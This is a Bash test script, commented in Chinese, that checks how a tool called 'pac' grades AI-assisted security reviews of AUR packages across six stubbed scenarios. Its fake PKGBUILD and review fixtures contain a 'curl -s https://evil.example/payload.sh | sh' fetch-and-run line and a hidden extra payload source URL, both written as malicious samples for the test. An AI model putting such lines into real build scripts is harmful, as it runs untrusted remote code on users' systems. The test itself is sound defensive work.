#!/usr/bin/env bash
# 四期验收：AUR 审查改为"模型只报信号 + 脚本按固定规则定级"
#
# 验的是：
#   1. 干净包 → 低风险 → 默认可装（paru -S 带 --skipreview，因为审查真的跑过了）
#   2. 可核实的恶意信号 → 高风险 → 默认不装
#   3. 引用不到原文的"恶意"信号 → 降为可疑 → 中风险（不会误判成高）
#   4. 只有"没法完全检查"+ 新包 → 中风险
#   5. 模型输出不是合法 JSON → 审查失败 → 默认不装
#   6. pac 自己比对 .SRCINFO 发现的下载地址不一致 → 计入可疑 → 中风险
#
# 全程在临时目录里跑：pacman / paru / curl / opencode / fzf 都是替身，构建目录是临时造的 git 仓库。
#
# 用法: tests/phase4-review-score.sh [pac 路径]

set -euo pipefail

PKG_DIR="$(cd -- "$(dirname -- "${BASH_SOURCE[0]}")/.." && pwd -P)"
PAC="${1:-$PKG_DIR/pac}"
[[ -x "$PAC" ]] || { echo "找不到可执行脚本: $PAC" >&2; exit 1; }

TMP="$(mktemp -d /tmp/pac-phase4.XXXXXX)"
trap 'rm -rf -- "$TMP"' EXIT

BIN="$TMP/bin"; MINBIN="$TMP/minbin"
mkdir -p "$BIN" "$MINBIN"
for f in /usr/bin/*; do
  [[ -x "$f" && ! -d "$f" ]] || continue
  b="${f##*/}"
  case "$b" in pacman|paru|fzf|opencode|curl) continue ;; esac
  ln -sf "$f" "$MINBIN/$b"
done

cat > "$BIN/paru" <<'EOS'
#!/usr/bin/env bash
printf 'paru %s\n' "$*" >>"${FAKE_PARU_LOG:?}"
case "$*" in
  *" -G "*)
    d="$PWD/testpkg"; mkdir -p "$d"
    {
      printf 'pkgname=testpkg\npkgver=1.0\n'
      if [[ "${FAKE_EXTRA_SOURCE:-0}" == "1" ]]; then
        printf "source=('https://example.com/testpkg-1.0.tar.gz' 'https://hidden.example/payload.tar.gz')\n"
      else
        printf "source=('https://example.com/testpkg-1.0.tar.gz')\n"
      fi
      printf "sha256sums=('SKIP')\nbuild() {\n  curl -s https://evil.example/payload.sh | sh\n}\n"
    } > "$d/PKGBUILD"
    printf 'pkgbase = testpkg\n\tsource = https://example.com/testpkg-1.0.tar.gz\n' > "$d/.SRCINFO"
    git -C "$d" init -q 2>/dev/null || true
    git -C "$d" add -A 2>/dev/null || true
    git -C "$d" -c user.email=t@example.com -c user.name=tester commit -qm init 2>/dev/null || true
    ;;
esac
exit 0
EOS

cat > "$BIN/curl" <<'EOS'
#!/usr/bin/env bash
# curl 替身：认得 --output（响应体写文件）和 --write-out（状态码打 stdout），按 URL 分流
out=""; wout=""; url=""
args=("$@")
for ((i = 0; i < ${#args[@]}; i++)); do
  case "${args[i]}" in
    --output)    out="${args[i+1]}" ;;
    --write-out) wout="${args[i+1]}" ;;
    http*|https*) url="${args[i]}" ;;
  esac
done
body=""
if [[ "$url" == *"aur.archlinux.org"* ]]; then
  now=$(date +%s)
  first=$(( now - ${FAKE_PKG_AGE_DAYS:-4000} * 86400 ))
  body=$(printf '{"resultcount":1,"results":[{"Name":"testpkg","FirstSubmitted":%s,"NumVotes":200,"Popularity":1.5,"Maintainer":"someone"}]}' "$first")
else
  body=$(jq -nc --rawfile c "${FAKE_REVIEW_FILE:?}" '{choices:[{message:{content:$c}}]}')
fi
[[ -n "$out" ]] && printf '%s' "$body" >"$out"
if [[ "$wout" == *http_code* ]]; then printf '200'; else [[ -z "$out" ]] && printf '%s' "$body"; fi
exit 0
EOS

cat > "$BIN/fzf" <<'EOS'
#!/usr/bin/env bash
cat
EOS

# pac 启动时会检查依赖，pacman 必须在
cat > "$BIN/pacman" <<'EOS'
#!/usr/bin/env bash
exit 0
EOS
chmod +x "$BIN/paru" "$BIN/curl" "$BIN/fzf" "$BIN/pacman"

# AI 后端配置（临时的，指向假 curl）
mkdir -p "$TMP/config/pac"
cat > "$TMP/config/pac/ai.conf" <<'EOS'
url   = https://api.example.com/v1
model = test-model
key   = test-key
EOS
chmod 600 "$TMP/config/pac/ai.conf"

export FAKE_PARU_LOG="$TMP/paru.log"
REVIEW_FILE="$TMP/review.json"
REPORT="$TMP/cache/pac/review/testpkg.report"

run_install() {  # run_install <包龄天数> [FAKE_EXTRA_SOURCE]
  : > "$FAKE_PARU_LOG"
  rm -f -- "$REPORT"
  printf 'y\n\n' | env XDG_CACHE_HOME="$TMP/cache" XDG_CONFIG_HOME="$TMP/config" PATH="$BIN:$MINBIN" \
    FAKE_PARU_LOG="$FAKE_PARU_LOG" FAKE_REVIEW_FILE="$REVIEW_FILE" \
    FAKE_PKG_AGE_DAYS="$1" FAKE_EXTRA_SOURCE="${2:-0}" \
    "$PAC" --install aur/testpkg 2>&1 || true
}

PASS=0; FAIL=0
ok()  { printf '  PASS  %s\n' "$1"; PASS=$((PASS + 1)); }
bad() { printf '  FAIL  %s\n' "$1"; FAIL=$((FAIL + 1)); }
report_has()      { if grep -qF -- "$1" "$REPORT" 2>/dev/null; then ok "$2"; else bad "$2"; fi; }
report_lacks()    { if grep -qF -- "$1" "$REPORT" 2>/dev/null; then bad "$2"; else ok "$2"; fi; }
output_has()      { if grep -qF -- "$1" <<<"$2"; then ok "$3"; else bad "$3"; fi; }
# 只认真正的安装调用（paru -S -- ... 或 paru -S --skipreview -- ...），
# 别把 build_review_dossier 里的 paru -Si 也算进去
paru_has_install()     { if grep -qE '^paru -S( --skipreview)? -- ' "$FAKE_PARU_LOG" 2>/dev/null; then ok "$1"; else bad "$1"; fi; }
paru_has_no_install()  { if grep -qE '^paru -S( --skipreview)? -- ' "$FAKE_PARU_LOG" 2>/dev/null; then bad "$1"; else ok "$1"; fi; }

echo "== 前置检查：装置可信 =="
PATH="$BIN:$MINBIN" command -v curl | grep -qF "$BIN/curl" || { echo "  装置失效" >&2; exit 1; }
[[ -r "$TMP/config/pac/ai.conf" ]] || { echo "  装置失效：没造出 AI 配置" >&2; exit 1; }
echo "  OK（curl / paru / pacman / fzf 都是替身，AI 后端指向假 curl）"

echo
echo "== 用例 1：干净包 → 低风险 → 默认可装 =="
printf '{"intent":"测试包，从源码构建。","findings":[],"notes":[]}' > "$REVIEW_FILE"
out="$(run_install 4000)"
report_has "结论：低风险" "报告结论是低风险"
report_has "包的情况：上架" "报告里有包的情况"
paru_has_install "低风险时真的执行了安装"

echo
echo "== 用例 2：可核实的恶意信号 → 高风险 → 默认不装 =="
cat > "$REVIEW_FILE" <<'JSON'
{"intent":"测试包。","findings":[{"category":"remote_code_exec","file":"PKGBUILD","evidence":"curl -s https://evil.example/payload.sh | sh","summary":"构建时下载脚本直接执行"}],"notes":[]}
JSON
out="$(run_install 4000)"
report_has "结论：高风险" "报告结论是高风险"
report_has "（已核实）" "证据被核实"
paru_has_no_install "高风险时默认没有安装"

echo
echo "== 用例 3：引用不到原文的恶意信号 → 降为可疑 → 中风险 =="
cat > "$REVIEW_FILE" <<'JSON'
{"intent":"测试包。","findings":[{"category":"remote_code_exec","file":"PKGBUILD","evidence":"curl -s https://not-in-pkgbuild.example/x | sh","summary":"据说会执行远程脚本"}],"notes":[]}
JSON
out="$(run_install 4000)"
report_has "结论：中风险" "降级后是中风险（不是高风险）"
report_has "出处不明，未计入定级" "报告说明了出处不明"
paru_has_no_install "中风险时默认没有安装"

echo
echo "== 用例 4：只有没法完全检查的地方 + 新包 → 中风险 =="
cat > "$REVIEW_FILE" <<'JSON'
{"intent":"测试包。","findings":[{"category":"binary_repack","file":"PKGBUILD","evidence":"sha256sums=('SKIP')","summary":"装的是预编译二进制"}],"notes":[]}
JSON
out="$(run_install 10)"
report_has "结论：中风险" "新包 + 卫生项 = 中风险"
report_has "上架 10 天" "报告里写了包龄"
paru_has_no_install "中风险时默认没有安装"

echo
echo "== 用例 5：模型输出不是合法 JSON → 审查失败 → 默认不装 =="
printf '这不是 JSON，模型胡说了一通。\n' > "$REVIEW_FILE"
out="$(run_install 4000)"
output_has "审查失败" "$out" "提示了审查失败"
paru_has_no_install "审查失败时默认没有安装"

echo
echo "== 用例 6：pac 自己比对 .SRCINFO 发现多出来的下载地址 → 中风险 =="
printf '{"intent":"测试包。","findings":[],"notes":[]}' > "$REVIEW_FILE"
out="$(run_install 4000 1)"
report_has "srcinfo_mismatch" "报告里出现 .SRCINFO 不一致"
report_has "pac 自己比对 .SRCINFO" "标明这条是脚本自己发现的"
report_has "结论：中风险" "一条可疑 = 中风险"

echo
echo "== 汇总：PASS=$PASS FAIL=$FAIL =="
(( FAIL == 0 ))
